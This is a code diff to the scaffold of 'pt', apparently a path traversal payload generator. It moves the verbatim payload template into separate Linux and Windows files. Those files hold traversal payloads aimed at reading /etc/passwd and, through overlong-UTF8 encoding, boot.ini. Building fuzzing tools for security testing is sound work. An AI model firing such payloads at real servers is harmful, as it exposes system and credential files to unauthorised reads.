@@ -250,7 +250,7 @@ const MACOS_TARGET_TXT = `# macOS targets: /System, /Library, /Users, /private, 
 // Cross-category files, at the templates/ root
 // ---------------------------------------------------------------------------
 
-const RAW_TXT = `# Verbatim payloads.
+const RAW_HEADER = `# Verbatim payloads.
 #
 # Lines in this file are emitted exactly as written: never decomposed into slots,
 # never rewritten by a strategy, never repeat-multiplied. They exist for
@@ -264,6 +264,23 @@ const RAW_TXT = `# Verbatim payloads.
 #
 # Note: '#' only starts a comment when followed by whitespace, another '#', or
 # end of line, so a payload such as '#.png' needs no escaping.
+`
+
+// Split per platform so the scaffold writes the same paths the harvested corpus
+// uses (templates/<category>/raw.txt). A single templates/raw.txt meant a config
+// copied out of the repo needed exactly one path edited to run here, which is
+// the kind of papercut nobody reports and everybody hits.
+const LINUX_RAW_TXT = `${RAW_HEADER}#
+# Self-referencing noise interleaved with the traversal, and a doubled junction:
+# the chain's last step drops the '/.' the others carry, so no single primitive
+# repeated N times produces it.
+./.././.././..//etc/passwd
+`
+
+const WINDOWS_RAW_TXT = `${RAW_HEADER}#
+# The repeated separator is an overlong-UTF8 '/' while the last one is an
+# overlong '\\' -- two spellings in one chain, so it cannot be generated from a
+# single traversal primitive.
 ..%c0%af..%c0%af..%c0%af..%c1%9cboot.ini
 `
 
@@ -319,6 +336,8 @@ export const CONFIG_YML = `# pt -- path traversal payload generator
 #                                   target:    ./templates/windows/target.txt
 #                                              ./templates/language/target-dotnet.txt
 #                                   suffix:    ./templates/windows/suffix.txt
+#                                 and under 'raw_file:'
+#                                   ./templates/windows/raw.txt
 #                                 (the scaffold writes no target-dotnet.txt; add
 #                                  the one from the repo's templates/language/,
 #                                  or start it with 'pt add')
@@ -403,7 +422,8 @@ slots:
 # Emitted verbatim: never decomposed, transformed or repeat-multiplied.
 # For real-world entries that are internally inconsistent and cannot be generated.
 raw_file:
-  - ./templates/raw.txt
+  - ./templates/linux/raw.txt
+# Add ./templates/windows/raw.txt alongside it when you switch to Windows.
 
 # --- strategies -------------------------------------------------------------
 # An ordered UNION of pipelines -- NOT a cross-product. Each entry is one
@@ -497,6 +517,7 @@ export const SEED_TEMPLATES: ReadonlyArray<SeedFile> = [
   { path: "templates/windows/target.txt", contents: WINDOWS_TARGET_TXT },
   { path: "templates/windows/suffix.txt", contents: WINDOWS_SUFFIX_TXT },
   { path: "templates/macos/target.txt", contents: MACOS_TARGET_TXT },
-  { path: "templates/raw.txt", contents: RAW_TXT },
+  { path: "templates/linux/raw.txt", contents: LINUX_RAW_TXT },
+  { path: "templates/windows/raw.txt", contents: WINDOWS_RAW_TXT },
   { path: "templates/target-padding.txt", contents: TARGET_PADDING_TXT }
 ]
